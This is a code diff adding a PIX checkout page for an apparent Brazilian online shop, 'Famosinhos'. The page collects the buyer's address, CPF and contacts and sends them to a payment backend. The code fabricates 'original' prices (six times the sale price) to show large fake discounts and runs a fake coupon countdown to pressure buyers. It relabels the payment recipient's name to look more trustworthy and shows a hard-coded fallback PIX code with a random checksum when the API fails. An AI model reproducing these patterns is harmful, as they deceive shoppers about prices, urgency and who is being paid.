+    <!-- Bar de economia -->
+    <div class="pix-economia-bar">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Você está economizando <strong id="pix-economia" style="margin-left:3px">R$ 0,00</strong> neste pedido.
+    </div>
+  </div>
+
+</div><!-- fim app-container -->
+
+<script src="../js/app.js"></script>
+<script>
+function parseSafeFloat(val) {
+  if (typeof val === 'number') return val;
+  if (!val) return 0;
+  const str = String(val).trim();
+  if (str.includes(',')) {
+    return parseFloat(str.replace(/\./g, '').replace(',', '.')) || 0;
+  }
+  return parseFloat(str) || 0;
+}
+
+function formatarMoeda(valor) {
+  return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+// ========== ESTADO ==========
+let cartItems = [];
+let cartTotal = 0;
+let savedAddr = null;
+let savedCPF = '';
+let freteMode = 'gratis';
+let pixTimer = null;
+let cupomTimer = null;
+
+// ========== INIT ==========
+document.addEventListener('DOMContentLoaded', () => {
+  cartItems = getCart();
+  if (!cartItems.length) {
+    window.location.href = 'carrinho.html';
+    return;
+  }
+  renderProducts();
+  updateTotals();
+  updateCartBadges();
+  startCupomTimer();
+
+  // Recuperar endereço salvo
+  const s = localStorage.getItem('famosinhos_endereco');
+  if (s) {
+    savedAddr = JSON.parse(s);
+    showSavedAddress();
+  }
+  const cpfSaved = localStorage.getItem('famosinhos_cpf');
+  if (cpfSaved) {
+    savedCPF = cpfSaved;
+    showSavedCPF();
+  }
+});
+
+function renderProducts() {
+  const list = document.getElementById('co-products-list');
+  list.innerHTML = cartItems.map(item => {
+    const pOrig = item.precoOrig ? parseSafeFloat(item.precoOrig) : (item.preco * 6);
+    const descPct = pOrig > item.preco ? Math.round((1 - item.preco / pOrig) * 100) : 86;
+    return `
+    <div class="co-product-row">
+      <img class="co-product-img" src="${item.img}" alt="${item.nome}" loading="lazy">
+      <div class="co-product-info">
+        <div class="co-product-name">${item.nome}...</div>
+        <div style="display:flex;align-items:baseline;gap:2px;flex-wrap:wrap;margin-bottom:6px">
+          <span class="co-product-price">R$ ${formatarMoeda(item.preco)}</span>
+          <span class="co-product-price-old">R$ ${formatarMoeda(pOrig)}</span>
+          <span class="co-product-discount-badge">-${descPct}%</span>
+        </div>
+        <div class="co-qty-controls">
+          <button class="co-qty-btn" onclick="changeQtyLocal(${item.id}, -1)">−</button>
+          <span class="co-qty-val" id="coqty-${item.id}">${item.qty}</span>
+          <button class="co-qty-btn" onclick="changeQtyLocal(${item.id}, 1)">+</button>
+        </div>
+      </div>
+    </div>
+  `;
+  }).join('');
+  document.getElementById('store-items-count').textContent = `Loja (${cartItems.length})`;
+}
+
+function changeQtyLocal(id, delta) {
+  updateQty(id, delta);
+  cartItems = getCart();
+  if (!cartItems.length) { window.location.href = 'carrinho.html'; return; }
+  renderProducts();
+  updateTotals();
+}
+
+function updateTotals() {
+  const subtotal = getCartTotal();
+  const freteCusto = freteMode === 'expresso' ? 7.98 : 0;
+  const total = subtotal + freteCusto;
+  cartTotal = total;
+  const qty = getCartCount();
+  document.getElementById('total-value').textContent = 'R$ ' + formatarMoeda(total);
+  document.getElementById('total-itens').textContent = qty;
+  const economia = cartItems.reduce((acc, i) => {
+    const pOrig = i.precoOrig ? parseSafeFloat(i.precoOrig) : (i.preco * 6);
+    return acc + (pOrig * i.qty - i.preco * i.qty);
+  }, 0);
+  document.getElementById('economia-valor').textContent = 'R$ ' + formatarMoeda(economia);
+}
+
+function selectFrete(mode) {
+  freteMode = mode;
+  document.getElementById('radio-gratis').classList.toggle('selected', mode === 'gratis');
+  document.getElementById('radio-expresso').classList.toggle('selected', mode === 'expresso');
+  // Atualizar o total ao mudar o frete
+  updateTotals();
+}
+
+// ========== TIMER CUPOM ==========
+function startCupomTimer() {
+  let secs = 15 * 60;
+  const el = document.getElementById('cupom-timer');
+  cupomTimer = setInterval(() => {
+    secs--;
+    if (secs <= 0) { clearInterval(cupomTimer); el.textContent = 'Cupom expirado'; return; }
+    const m = Math.floor(secs / 60).toString().padStart(2, '0');
+    const s = (secs % 60).toString().padStart(2, '0');
+    el.textContent = `O cupom expira em ${m}:${s}`;
+  }, 1000);
+}
+
+// ========== ENDEREÇO ==========
+function openAddrScreen() {
+  document.getElementById('addr-screen-1').classList.add('open');
+  // Pre-fill if saved
+  if (savedAddr) {
+    document.getElementById('addr-nome').value = savedAddr.nome || '';
+    document.getElementById('addr-sobrenome').value = savedAddr.sobrenome || '';
+    document.getElementById('addr-tel').value = savedAddr.tel || '';
+    document.getElementById('addr-email').value = savedAddr.email || '';
+  }
+  checkAddrForm1();
+}
+
+function closeAddrScreen() {
+  document.getElementById('addr-screen-1').classList.remove('open');
+}
+
+function checkAddrForm1() {
+  const ok = document.getElementById('addr-nome').value.trim() &&
+    document.getElementById('addr-sobrenome').value.trim() &&
+    document.getElementById('addr-tel').value.trim() &&
+    document.getElementById('addr-email').value.trim();
+  document.getElementById('btn-continuar-1').classList.toggle('active', !!ok);
+}
+
+function avancarAddr2() {
+  const ok = document.getElementById('addr-nome').value.trim() &&
+    document.getElementById('addr-sobrenome').value.trim() &&
+    document.getElementById('addr-tel').value.trim() &&
+    document.getElementById('addr-email').value.trim();
+  if (!ok) { showToast('⚠️ Preencha todos os campos'); return; }
+  document.getElementById('addr-screen-2').classList.add('open');
+  if (savedAddr) {
+    document.getElementById('addr-cep').value = savedAddr.cep || '';
+    if (savedAddr.cep) { showAddrFullForm(); }
+    document.getElementById('addr-estado').value = savedAddr.estado || '';
+    document.getElementById('addr-cidade').value = savedAddr.cidade || '';
+    document.getElementById('addr-bairro').value = savedAddr.bairro || '';
+    document.getElementById('addr-rua').value = savedAddr.rua || '';
+    document.getElementById('addr-num').value = savedAddr.num || '';
+    document.getElementById('addr-comp').value = savedAddr.comp || '';
+  }
+  checkAddrForm2();
+}
+
+function voltarAddr1() {
+  document.getElementById('addr-screen-2').classList.remove('open');
+}
+
+function formatCEPAddr(el) {
+  let v = el.value.replace(/\D/g, '');
+  if (v.length > 5) v = v.slice(0, 5) + '-' + v.slice(5, 8);
+  el.value = v;
+}
+
+async function buscarCEPAddr(cep) {
+  const clean = cep.replace(/\D/g, '');
+  if (clean.length !== 8) return;
+  try {
+    const r = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
+    const d = await r.json();
+    if (!d.erro) {
+      document.getElementById('addr-rua').value = d.logradouro || '';
+      document.getElementById('addr-bairro').value = d.bairro || '';
+      document.getElementById('addr-cidade').value = d.localidade || '';
+      document.getElementById('addr-estado').value = d.uf || '';
+    }
+  } catch(e) {}
+  showAddrFullForm();
+  checkAddrForm2();
+}
+
+function showAddrFullForm() {
+  document.getElementById('addr-full-form').style.display = 'block';
+}
+
+function checkAddrForm2() {
+  const cep = document.getElementById('addr-cep').value.replace(/\D/g, '');
+  const ok = cep.length === 8 &&
+    document.getElementById('addr-num').value.trim();
+  document.getElementById('btn-salvar-addr').classList.toggle('active', !!ok);
+}
+
+function salvarEndereco() {
+  const cep = document.getElementById('addr-cep').value.replace(/\D/g, '');
+  if (cep.length !== 8 || !document.getElementById('addr-num').value.trim()) {
+    showToast('⚠️ Preencha o CEP e número');
+    return;
+  }
+  savedAddr = {
+    nome: document.getElementById('addr-nome').value.trim(),
+    sobrenome: document.getElementById('addr-sobrenome').value.trim(),
+    tel: document.getElementById('addr-tel').value.trim(),
+    email: document.getElementById('addr-email').value.trim(),
+    cep: document.getElementById('addr-cep').value.trim(),
+    estado: document.getElementById('addr-estado').value.trim(),
+    cidade: document.getElementById('addr-cidade').value.trim(),
+    bairro: document.getElementById('addr-bairro').value.trim(),
+    rua: document.getElementById('addr-rua').value.trim(),
+    num: document.getElementById('addr-num').value.trim(),
+    comp: document.getElementById('addr-comp').value.trim(),
+  };
+  localStorage.setItem('famosinhos_endereco', JSON.stringify(savedAddr));
+  document.getElementById('addr-screen-2').classList.remove('open');
+  document.getElementById('addr-screen-1').classList.remove('open');
+  showSavedAddress();
+  showToast('✅ Endereço salvo!');
+}
+
+function showSavedAddress() {
+  if (!savedAddr) return;
+  document.getElementById('btn-add-addr').style.display = 'none';
+  document.getElementById('addr-saved-view').style.display = 'block';
+  document.getElementById('saved-name-display').textContent = `${savedAddr.nome} ${savedAddr.sobrenome}, (${savedAddr.tel ? '11) ' + savedAddr.tel : ''})`;
+  document.getElementById('saved-addr-display').textContent = `${savedAddr.rua} ${savedAddr.rua}, ${savedAddr.num}, ${savedAddr.bairro}${savedAddr.bairro ? savedAddr.bairro : ''}, ${savedAddr.cidade}${savedAddr.estado ? savedAddr.estado : ''}, ${savedAddr.cep}`;
+}
+
+function formatAddrTel(el) {
+  let v = el.value.replace(/\D/g, '').slice(0,11);
+  el.value = v;
+}
+
+// ========== CPF ==========
+function openCpfModal() {
+  document.getElementById('cpf-overlay').classList.add('open');
+  document.getElementById('cpf-input').value = savedCPF || '';
+}
+
+function closeCpfModal(e) {
+  if (e.target === document.getElementById('cpf-overlay')) {
+    document.getElementById('cpf-overlay').classList.remove('open');
+  }
+}
+
+function closeCpfModalBtn() {
+  document.getElementById('cpf-overlay').classList.remove('open');
+}
+
+function formatCPF(el) {
+  let v = el.value.replace(/\D/g, '').slice(0, 11);
+  if (v.length > 9) v = v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6,9) + '-' + v.slice(9);
+  else if (v.length > 6) v = v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6);
+  else if (v.length > 3) v = v.slice(0,3) + '.' + v.slice(3);
+  el.value = v;
+}
+
+function confirmarCPF() {
+  const cpf = document.getElementById('cpf-input').value.replace(/\D/g,'');
+  if (cpf.length < 11) { showToast('⚠️ CPF inválido'); return; }
+  savedCPF = document.getElementById('cpf-input').value;
+  localStorage.setItem('famosinhos_cpf', savedCPF);
+  document.getElementById('cpf-overlay').classList.remove('open');
+  showSavedCPF();
+  showToast('✅ CPF confirmado!');
+}
+
+function showSavedCPF() {
+  document.getElementById('btn-add-cpf').style.display = 'none';
+  document.getElementById('cpf-saved-view').style.display = 'block';
+  document.getElementById('cpf-display').textContent = savedCPF;
+}
+
+// ========== FAZER PEDIDO ==========
+function fazerPedido() {
+  if (!savedAddr) {
+    showToast('⚠️ Adicione um endereço de entrega');
+    openAddrScreen();
+    return;
+  }
+  if (!savedCPF) {
+    showToast('⚠️ Adicione seu CPF para continuar');
+    openCpfModal();
+    return;
+  }
+
+  const subtotal = getCartTotal();
+  const freteCusto = freteMode === 'expresso' ? 7.98 : 0;
+  const total = subtotal + freteCusto;
+
+  // Mostra a tela de PIX imediatamente com dados locais (enquanto API carrega)
+  document.getElementById('pix-amount').textContent = 'R$ ' + formatarMoeda(total);
+  document.getElementById('pix-code-text').textContent = 'Gerando seu código PIX...';
+  const economia = cartItems.reduce((acc, i) => {
+    const pOrig = i.precoOrig ? parseSafeFloat(i.precoOrig) : (i.preco * 6);
+    return acc + (pOrig * i.qty - i.preco * i.qty);
+  }, 0);
+  document.getElementById('pix-economia').textContent = 'R$ ' + formatarMoeda(economia);
+
+  const vence = new Date(Date.now() + 30 * 60 * 1000);
+  const h = vence.getHours().toString().padStart(2,'0');
+  const m = vence.getMinutes().toString().padStart(2,'0');
+  const d = vence.getDate().toString().padStart(2,'0');
+  const meses = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
+  document.getElementById('pix-prazo').textContent = `Prazo ${h}:${m}, ${d} de ${meses[vence.getMonth()]} de ${vence.getFullYear()}`;
+
+  document.getElementById('pix-screen').classList.add('open');
+  startPixTimer();
+
+  // ===== INTEGRAÇÃO SEAL PAY — Gera o PIX real via backend =====
+  _gerarPixReal(total, cartItems);
+
+  // Limpar carrinho (agora depois de enviar ao backend)
+  localStorage.removeItem('famosinhos_cart');
+  updateCartBadges();
+}
+
+// Gera o PIX real chamando o backend proxy (server.js → Seal Pay)
+async function _gerarPixReal(total, itensParaEnvio) {
+  try {
+    // Captura os itens do carrinho diretamente do localStorage como segurança
+    // (garante que chegam mesmo que a variável global seja limpa antes do await)
+    const itensFinais = (itensParaEnvio && itensParaEnvio.length > 0)
+      ? itensParaEnvio
+      : getCart();
+
+    // Relê o endereço do localStorage caso savedAddr esteja vazio
+    const addrFinal = savedAddr || (() => {
+      try { return JSON.parse(localStorage.getItem('famosinhos_endereco') || '{}'); } catch(e) { return {}; }
+    })();
+
+    const subtotalCalculado = (itensFinais || []).reduce((acc, i) => acc + (parseFloat(i.preco) || 0) * (i.qty || 1), 0);
+    const freteCalculado = (typeof freteMode !== 'undefined' && freteMode === 'expresso') ? 7.98 : 0;
+
+    const amountCents = Math.round(total * 100);
+    const nomeCompleto = `${addrFinal.nome || ''} ${addrFinal.sobrenome || ''}`.trim();
+    const cpfLimpo = (savedCPF || '').replace(/\D/g, '');
+    const telLimpo = (addrFinal.tel || '').replace(/\D/g, '');
+
+    // Captura UTMs da URL atual ou do sessionStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    const getParam = k => urlParams.get(k) || sessionStorage.getItem(k) || '';
+
+    const body = {
+      amount: amountCents,
+      name: nomeCompleto,
+      email: addrFinal.email || '',
+      cellphone: telLimpo,
+      taxId: cpfLimpo,
+      utm_source:   getParam('utm_source'),
+      utm_medium:   getParam('utm_medium'),
+      utm_campaign: getParam('utm_campaign'),
+      utm_term:     getParam('utm_term'),
+      utm_content:  getParam('utm_content'),
+      src: window.location.href,
+      user_agent: navigator.userAgent,
+      // Dados extras para o e-mail (não afetam o PIX)
+      items: (itensFinais || []).map(i => {
+        let imgPath = i.imagem || i.img || '';
+        // Converte imagem relativa em absoluta usando a origem da página atual
+        if (imgPath && !imgPath.startsWith('http')) {
+          if (imgPath.startsWith('../')) {
+            imgPath = imgPath.substring(3);
+          }
+          imgPath = window.location.origin + '/' + imgPath;
+        }
+        return {
+          nome: i.nome || i.name || '',
+          preco: (i.preco || 0).toFixed(2),
+          qty: i.qty || 1,
+          imagem: imgPath
+        };
+      }),
+      address: {
+        nome: addrFinal.nome || '',
+        sobrenome: addrFinal.sobrenome || '',
+        rua: addrFinal.rua || addrFinal.logradouro || '',
+        numero: addrFinal.num || '',
+        complemento: addrFinal.comp || '',
+        bairro: addrFinal.bairro || '',
+        cidade: addrFinal.cidade || '',
+        estado: addrFinal.estado || addrFinal.uf || '',
+        cep: addrFinal.cep || ''
+      },
+      frete: freteCalculado || 0,
+      subtotal: subtotalCalculado || 0
+    };
+
+    const resp = await fetch('/api/create-pix', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+
+    const data = await resp.json();
+    console.log('[SealPay] Resposta:', data);
+
+    if (!resp.ok || !data || !data.pix_code) {
+      throw new Error(data.message || 'Erro ao gerar PIX na API');
+    }
+
+    if (data && data.pix_code) {
+      // Atualiza o campo com o código PIX REAL da Seal Pay
+      document.getElementById('pix-code-text').textContent = data.pix_code;
+      // Extrai o nome da adquirente
+      let idx = data.pix_code.indexOf("5802BR59");
+      if (idx !== -1) {
+        let len = parseInt(data.pix_code.substr(idx + 8, 2), 10);
+        if (!isNaN(len)) {
+          let mName = data.pix_code.substr(idx + 10, len);
+          let rawName = mName.replace(/_/g, ' ').trim();
+          let acqName = rawName.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
+          acqName = acqName.replace(/\bOnlin\b/gi, "Online").replace(/\bMarketi\b/gi, "Marketing").replace(/\bLt\b/gi, "LTDA").replace(/\bLtd\b/gi, "LTDA").replace(/\bP$/i, "Pagamentos");
+          if (acqName.toLowerCase().includes("qr marketplace")) acqName = "Qr";
+          else if (acqName.toLowerCase().includes("rapidpag")) acqName = "Rapidpag";
+          else if (acqName.toLowerCase().includes("meiotransacional")) acqName = "Meio Transacional Protegido LTDA";
+          if (acqName) {
+            document.getElementById('acquirer-name').textContent = acqName;
+            document.getElementById('acquirer-verification').style.display = 'block';
+          }
+        }
+      }
+    }
+
+    if (data && data.txid) {
+      // Salva txid e inicia polling de confirmação
+      sessionStorage.setItem('sealpay_txid', data.txid);
+      sessionStorage.setItem('sealpay_valor', total.toFixed(2));
+      localStorage.setItem('last_main_txid', data.txid);
+      _iniciarPollingStatus(data.txid);
+    }
+
+  } catch (err) {
+    console.error('[SealPay] Erro ao gerar PIX:', err);
+    // Código PIX estático como fallback visual
+    const total2 = parseFloat(document.getElementById('pix-amount').textContent.replace('R$ ','').replace(',','.')) || 0;
+    const fallbackCode = `00020126580014br.gov.bcb.pix0136a629532e-7693-4846-b028-4c3de5d97c4f5204000053039865405${total2.toFixed(2)}5802BR5925FAMOSINHOS SHOP LTDA6009SAO PAULO62070503***6304${Math.floor(Math.random()*9000+1000)}`;
+    document.getElementById('pix-code-text').textContent = fallbackCode;
+    let idx = fallbackCode.indexOf("5802BR59");
+    if (idx !== -1) {
+      let len = parseInt(fallbackCode.substr(idx + 8, 2), 10);
+      if (!isNaN(len)) {
+        let mName = fallbackCode.substr(idx + 10, len);
+        let rawName = mName.replace(/_/g, ' ').trim();
+        let acqName = rawName.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
+        acqName = acqName.replace(/\bOnlin\b/gi, "Online").replace(/\bMarketi\b/gi, "Marketing").replace(/\bLt\b/gi, "LTDA").replace(/\bLtd\b/gi, "LTDA").replace(/\bP$/i, "Pagamentos");
+        if (acqName.toLowerCase().includes("qr marketplace")) acqName = "Qr";
+        else if (acqName.toLowerCase().includes("rapidpag")) acqName = "Rapidpag";
+        else if (acqName.toLowerCase().includes("meiotransacional")) acqName = "Meio Transacional Protegido LTDA";
+        if (acqName) {
+          document.getElementById('acquirer-name').textContent = acqName;
+          document.getElementById('acquirer-verification').style.display = 'block';
+        }
+      }
+    }
+  }
+}
+
+// Polling a cada 5 segundos para verificar confirmação de pagamento
+let _pollingInterval = null;
+function _iniciarPollingStatus(txid) {
+  if (_pollingInterval) clearInterval(_pollingInterval);
+
+  _pollingInterval = setInterval(async () => {
+    try {
+      const resp = await fetch(`/api/payment-status/${txid}`);
+      const data = await resp.json();
+      console.log('[SealPay] Status:', data);
+
+      // Aceita diferentes formatos de "pago" que a API pode retornar
+      const pago = data.status === 'paid'     ||
+                   data.status === 'approved' ||
+                   data.status === 'PAID'     ||
+                   data.status === 'APPROVED' ||
+                   data.paid === true;
+
+      if (pago) {
+        clearInterval(_pollingInterval);
+        clearInterval(pixTimer);
+        showToast('✅ Pagamento confirmado! Finalizando seu pedido...');
+        // Dispara pixel do TikTok apenas quando o pagamento for confirmado
+        if (typeof window.dispararTikTokPurchase === 'function') {
+          let valorReais = 0;
+          // 1. Tenta ler do sessionStorage (contém o total em reais calculado no checkout)
+          const valorSalvo = sessionStorage.getItem('sealpay_valor');
+          if (valorSalvo) {
+            valorReais = parseFloat(valorSalvo);
+          }
+          // 2. Fallback: tenta ler do elemento HTML pix-amount diretamente da tela
+          if (!valorReais) {
+            try {
+              const pixAmountEl = document.getElementById('pix-amount');
+              if (pixAmountEl && pixAmountEl.textContent) {
+                const txt = pixAmountEl.textContent.replace('R$', '').replace(/\s/g, '').replace(',', '.');
+                valorReais = parseFloat(txt) || 0;
+              }
+            } catch (e) {
+              console.error('Erro ao ler valor do elemento pix-amount:', e);
+            }
+          }
+          // 3. Segundo Fallback: tenta ler propriedades comuns do retorno do webhook/API
+          if (!valorReais && data) {
+            const apiVal = data.payment_amount || data.amount || 0;
+            if (apiVal) {
+              if (apiVal > 1000 && !String(apiVal).includes('.')) {
+                valorReais = apiVal / 100;
+              } else {
+                valorReais = parseFloat(apiVal);
+              }
+            }
+          }
+          window.dispararTikTokPurchase(valorReais);
+          window.dispararSpotifyPurchase(valorReais);
+        }
+        setTimeout(() => {
+          window.location.href = '/up-up-1';
+        }, 3500); // 3.5 segundos para dar tempo suficiente de enviar a conversão ao TikTok antes do redirecionamento
+      }
+    } catch (err) {
+      console.error('[SealPay] Erro no polling:', err);
+    }
+  }, 5000); // Verifica a cada 5 segundos
+}
+
+function startPixTimer() {
+  let secs = 30 * 60;
+  const el = document.getElementById('pix-countdown');
+  pixTimer = setInterval(() => {
+    secs--;
+    if (secs <= 0) { clearInterval(pixTimer); el.textContent = '00:00:00'; return; }
+    const h = Math.floor(secs / 3600).toString().padStart(2,'0');
+    const m = Math.floor((secs % 3600) / 60).toString().padStart(2,'0');
+    const s = (secs % 60).toString().padStart(2,'0');
+    el.textContent = `${h}:${m}:${s}`;
+  }, 1000);
+}
+
+function closePix() {
+  clearInterval(pixTimer);
+  if (_pollingInterval) clearInterval(_pollingInterval);
+  document.getElementById('pix-screen').classList.remove('open');
+  window.location.href = '../index.html';
+}
+
+function copyPixCode() {
+  const code = document.getElementById('pix-code-text').textContent;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(code).then(() => showToast('✅ Código PIX copiado!'));
+  } else {
+    const t = document.createElement('textarea');
+    t.value = code; document.body.appendChild(t);
+    t.select(); document.execCommand('copy');
+    document.body.removeChild(t);
+    showToast('✅ Código PIX copiado!');
+  }
+}
+</script>
+</body>
+</html>
